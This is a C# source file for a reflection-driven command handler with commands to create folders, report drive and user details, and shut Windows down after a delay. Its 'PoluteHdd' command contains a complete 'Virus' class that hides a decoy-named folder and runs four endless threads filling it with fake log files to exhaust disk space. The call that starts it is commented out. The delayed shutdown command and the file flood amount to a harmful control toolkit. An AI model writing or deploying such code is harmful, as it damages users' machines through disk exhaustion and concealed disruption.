using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using System.Threading;
using System.Runtime.InteropServices;












namespace Commands
{
    public abstract class Command
    {
        public bool ValidationIsSucces => _validationIsSucces;
        protected string[] _splited = Array.Empty<string>();
        protected bool _validationIsSucces = false;
        protected string _command = "";
        protected string[] _fWord;
        protected bool _isExeption = false;
        protected string _messageExeption = "";
        public bool BaseValidationIsSucces { protected set; get; }
        protected Command(string command, params string[] fWord)
        {
            command = command.Trim('/');
            _fWord = fWord;
            _command = SetCommand(command);
            if (!string.IsNullOrWhiteSpace(_command))
            {
                BaseValidationIsSucces = true;
                _validationIsSucces = SplitCommand(_command);
            }
        }
        public abstract IEnumerable<CommandParam> Params { get; }
        public abstract bool Execute();
        protected string SetCommand(string command)
        {
            if (BaseValidation(command, _fWord))
            {
                _validationIsSucces = true;
                return command.ToLower();
            }
            return "";
        }
        protected bool BaseValidation(string command, string[] firstWord)
        {
            var splited = command.Split(" ", StringSplitOptions.RemoveEmptyEntries);


            for(int i = 0; i < firstWord.Length; i++) 
            {
                if (splited.FirstOrDefault()?.ToLower() != firstWord[i].ToLower())
                {
                    return false;
                }
                if (splited.ElementAtOrDefault(1) != null)
                    splited = splited[1..];
            }
            _splited = splited;
            return true;
        }
        public abstract string GetCommandResult();
        public virtual async Task<bool> ExecuteAcync()
        {
            return await Task.Run(Execute);
        }
        protected abstract bool SplitCommand(string command);

        
    }

    public abstract class CommandHendler
    {
        public abstract IEnumerable<Command> Commands { get; }
        protected CommandHendler()
        {
           
        }
        public abstract string ExecuteCommand(string command);
        public abstract Task<string> ExecuteCommandAsync(string command);
    }

    public class ReflectionCommandHendler : CommandHendler
    {

        readonly Type _commandBaseType = typeof(Command);
        public ReflectionCommandHendler()
        {


            var assembly = System.Reflection.Assembly.GetExecutingAssembly();
            var commands = assembly.GetTypes().Where(t => t.BaseType == _commandBaseType);
            _commands = commands;
            
        }

        protected IEnumerable<Type> _commands;
        public override IEnumerable<Command> Commands => _commands?.Select(t => (Command)Activator.CreateInstance(t, ""));

        public override string ExecuteCommand(string command)
        {
            var c = GiveAppropriateCommand(command);
            if (c == null)
            {
                return "uknow command";
            }

            //Task t = c.ExecuteAcync();
            //t.ConfigureAwait(false);
            //t.Wait();
            c.Execute();
            return c.GetCommandResult();
        }
        protected Command GiveAppropriateCommand(string command)
        {

            var res = _commands?.Select(t => (Command)Activator.CreateInstance(t, command))?.FirstOrDefault(c => c.BaseValidationIsSucces);

            //foreach (var com in _commands)
            //{
            //    var cInst = (Command)Activator.CreateInstance(com, command);
            //    if (cInst.ValidationIsSucces)
            //    {
            //        return cInst;
            //    }
            //}
            return res;
        }

        public override async Task<string> ExecuteCommandAsync(string command)
        {
            var c = GiveAppropriateCommand(command);
            
            //await c.ExecuteAcync();

            return await Task.Run(()=> ExecuteCommand(command));
        }
    }


    public class CreateFolderCommand : Command
    {
        StringValue _path;
        EnumValue _attribute;
        public override IEnumerable<CommandParam> Params => _params.AsReadOnly();
        protected List<CommandParam> _params;
        public CreateFolderCommand(string command) : base(command, "create", "folder")
        {
            _params = new List<CommandParam> { _path, _attribute };
        }
        protected override bool SplitCommand(string command)
        {
            var path = _splited.FirstOrDefault();

            if (path == null)
            {
                return false;
            }

            DirectoryInfo directory = new (path);

            if (path == null || !directory.Parent.Exists || directory.Exists)
            {
                _isExeption = true;
                _messageExeption = "parent directory doesn't exist or created directory already exist";
                return false;
            }
            _path = new StringValue(path);

            var attribute = _splited.ElementAtOrDefault(1) ?? "";

            _attribute = new EnumValue(attribute, FileAttributes.Normal);
            return true;
        }

        public override bool Execute()
        {
            //var split = SplitCommand();
            if (_validationIsSucces)
            {
                try
                {
                    var d = Directory.CreateDirectory(_path.Value);
                    d.Attributes = (FileAttributes)_attribute.Value;
                }
                catch (Exception ex)
                {
                    _isExeption = true;
                    _messageExeption = ex.Message;
                }
                if (_isExeption)
                {
                    return false;
                }
            }
            return _validationIsSucces;
        }
        public override string GetCommandResult()
        {
            if (_validationIsSucces && !_isExeption)
            {
                return $"the folder {_path.Value} has been created";
            }
            else
            {
                return $"failure: PathValue is {_path?.Value} and Validation is {_validationIsSucces} ({_messageExeption})";
            }
        }
    }
    public class GiveHDDInfo : Command
    {
        string _giveRes = "";
        readonly List<CommandParam> _params;
        public override IEnumerable<CommandParam> Params => _params;
        public GiveHDDInfo(string command) : base(command, "info", "hdd")
        {
            _params = new List<CommandParam>();
        }
        public override bool Execute()
        {
            var res = false; 
            if (_validationIsSucces)
            {
                res = true;
                try
                {
                    var drives = DriveInfo.GetDrives();

                    if (drives == null) 
                        return false;


                    for (int i = 0; i < drives?.Length; i++)
                    {
                        var dr = drives[i];
                        _giveRes += $"name: {dr.Name}\n";
                        _giveRes += $"driveType: {dr.DriveType}\n";
                        _giveRes += $"driveFormat: {dr.DriveFormat}\n";
                        _giveRes += $"FreeSpace: {dr.AvailableFreeSpace}\n";
                        _giveRes += $"totalSize: {dr.TotalSize}\n";
                    }
                }
                catch(Exception ex)
                {
                    _isExeption = true;
                    _messageExeption = ex.Message;
                    res = false;
                }
                
            }
            return res; 
        }
        public override string GetCommandResult()
        {
            if (!_validationIsSucces || _isExeption)
            {
                return $"failure: {_validationIsSucces} ({_messageExeption})";
            }
            else
            {
                return _giveRes;
            }
        }

        protected override bool SplitCommand(string command)
        {
            return true;
        }
    }
    public class GetUserInfo : Command
    {
        string info = "";
        public GetUserInfo(string command) : base(command, "info", "user")
        {

        }

        public override IEnumerable<CommandParam> Params => new List<CommandParam>();

        public override bool Execute()
        {
            info += $"Domain name: {Environment.UserDomainName}\n";
            info += $"User name: {Environment.UserName}\n";
            info += $"Is interactive: {Environment.UserInteractive}\n";
            return true;
        }

        public override string GetCommandResult()
        {
            if (ValidationIsSucces)
            {
                return info;
            }
            else
            {
                return "validation faluire";
            }
        }

        protected override bool SplitCommand(string command)
        {
            return true;
        }
    }
    public class WindowsOff : Command
    {
        public WindowsOff(string comand) : base(comand, "off")
        {

        }
        public override IEnumerable<CommandParam> Params => new List<CommandParam>();
        
        [STAThread]
        public override bool Execute()
        {
            Task.Run(()=> 
            {
                try
                {
                    Thread.Sleep(100000);
                    System.Diagnostics.Process.Start("shutdown", "/s /t 0");
                }
                catch(Exception ex)
                {
                    _messageExeption = ex.Message;
                    _isExeption = true;
                }
            });
            return true;
        }

        public override string GetCommandResult()
        {
            if (ValidationIsSucces && !_isExeption)
            {
                return "computer will be shut down";
            }
            else
            {
                return $"message: {_messageExeption}\nValiation: {_validationIsSucces}";
            }
        }

        protected override bool SplitCommand(string command)
        {
            return true;
        }
    }
    public class PoluteHdd : Command
    {
        List<CommandParam> @params;
        StringValue _stringValue;
        public PoluteHdd(string command) : base(command, "polute")
        {
            @params = new List<CommandParam> { _stringValue };
        }
        public override IEnumerable<CommandParam> Params => @params;

        public override bool Execute()
        {
            if (_validationIsSucces)
            {
                //Virus v = new("");

                return true;
            }
            return false;
        }

        public override string GetCommandResult()
        {
            throw new NotImplementedException();
        }
        internal class Virus
        {
            readonly string _path;
            string _name;
            public Virus(string path)
            {
                _path = path;
                _name = GetRandomNameDirectory();
            }

            public void StartWork()
            {

                Start4Threads();
            }

            private void MethodCode()
            {
                if (Directory.Exists(_path))
                {
                    string filesPath = Path.Combine(_path, _name);
                    var dir = Directory.CreateDirectory(filesPath);
                    dir.Attributes = FileAttributes.Hidden;

                    while (true)
                    {
                        string content = "";
                        content += GetContet();
                        string rName = GetRandomName();
                        WriteText(Path.Combine(filesPath, rName), content);
                    }
                }
            }
            public void Start4Threads()
            {
                Thread t = new Thread(MethodCode);
                Thread t2 = new Thread(MethodCode);
                Thread t3 = new Thread(MethodCode);
                Thread t4 = new Thread(MethodCode);
                t.Start();
                t2.Start();
                t3.Start();
                t4.Start();
            }
            private string GetRandomName()
            {
                var rLenth = System.Security.Cryptography.RandomNumberGenerator.GetInt32(4, 10);
                Random r = new Random();
                string rStr = "";

                for (int i = 0; i < rLenth; i++)
                {

                    var rNum = System.Security.Cryptography.RandomNumberGenerator.GetInt32(65, 91);
                    var rNum2 = System.Security.Cryptography.RandomNumberGenerator.GetInt32(97, 123);
                    var rNum3 = System.Security.Cryptography.RandomNumberGenerator.GetInt32(1, 3);

                    rStr += (char)(rNum3 == 1 ? rNum : rNum2);
                }
                return rStr + $"_{System.Security.Cryptography.RandomNumberGenerator.GetInt32(1, 10000)}";
            }
            private string GetRandomNameDirectory()
            {

                var arr = new string[] { "Logs", "Settings", "Cache", "Saves" };
                var rIndex = System.Security.Cryptography.RandomNumberGenerator.GetInt32(0, arr.Length);

                return arr[rIndex];
            }
            private void WriteText(string path, string content)
            {
                using (FileStream stream = new FileStream(path, FileMode.CreateNew, FileAccess.Write))
                {
                    stream.Write(System.Text.Encoding.UTF8.GetBytes(content));
                }
            }
            public string GetContet()
            {
                Random r = new Random();
                return $"Query_Time: {DateTime.Now.ToString("G")}:  {Math.Round(r.NextDouble(), 10)}  {System.Security.Cryptography.RandomNumberGenerator.GetInt32(1, 10)}_{System.Security.Cryptography.RandomNumberGenerator.GetInt32(1, 10)}  System32  Executed:{System.Security.Cryptography.RandomNumberGenerator.GetInt32(1, 100)}";
            }
        }
        protected override bool SplitCommand(string command)
        {
            var path = _splited.FirstOrDefault();
            if (!Directory.Exists(path))
            {
                return false;
            }
            StringValue stringValue = new StringValue(path);

            _stringValue = stringValue;

            return true;
        }
    }


    public abstract class CommandParam
    {
        protected string _strValue;
        protected Type _type;
        protected CommandParam(string strValue)
        {
            _strValue = strValue;
        }
        public abstract override string ToString();
        public new abstract Type GetType();
    }
    public abstract class CommandParam<T> : CommandParam
    {
        public T Value => _value;
        protected T _value = default(T);
        protected CommandParam(string value) : base(value)
        {
            _value = GetValue(value);
        }


        public abstract T GetValue(string value);
    }




    public class IntValue : CommandParam<int>
    {

        public IntValue(string value) : base(value)
        {

        }


        public override Type GetType()
        {
            return _value.GetType();
        }


        public override int GetValue(string value)
        {
            int res;
            var pRes = int.TryParse(value, out res);
            if (pRes)
            {
                return res;
            }
            return default(int);
        }

        public override string ToString()
        {
            return _value.ToString();
        }
    }
    public class FloatValue : CommandParam<float>
    {
        public FloatValue(string value) : base(value)
        {

        }
        public override Type GetType()
        {
            return _value.GetType();
        }

        public override float GetValue(string value)
        {
            float res;
            var pRes = float.TryParse(value, out res);
            if (pRes)
            {
                return res;
            }
            return default(float);
        }

        public override string ToString()
        {
            return _value.ToString();
        }
    }
    public class StringValue : CommandParam<string>
    {

        public StringValue(string value) : base(value)
        {

        }


        public override Type GetType()
        {
            return _value.GetType();
        }


        public override string GetValue(string value)
        {
            return value;
        }

        public override string ToString()
        {
            return _value.ToString();
        }
    }
    public class EnumValue : CommandParam<Enum>
    {
        Enum _defaultValue;
        Type _enumType;
        public EnumValue(string value, Enum defaultValue) : base(value)
        {
            _enumType = defaultValue.GetType();
            _defaultValue = defaultValue;
            _value = GetValue(value);

        }
        public override Type GetType()
        {
            return _enumType;
        }
        public override Enum GetValue(string value)
        {
            if (_enumType != null)
            {
                var values = Enum.GetValues(_enumType).Cast<object>();

                foreach (var v in values)
                {
                    var iV = v.ToString().ToLower();
                    if (iV == value.ToLower())
                    {
                        return (Enum)v;
                    }
                }
            }
            return _defaultValue;
        }

        public override string ToString()
        {
            return _value.ToString();
        }
    }

    
}
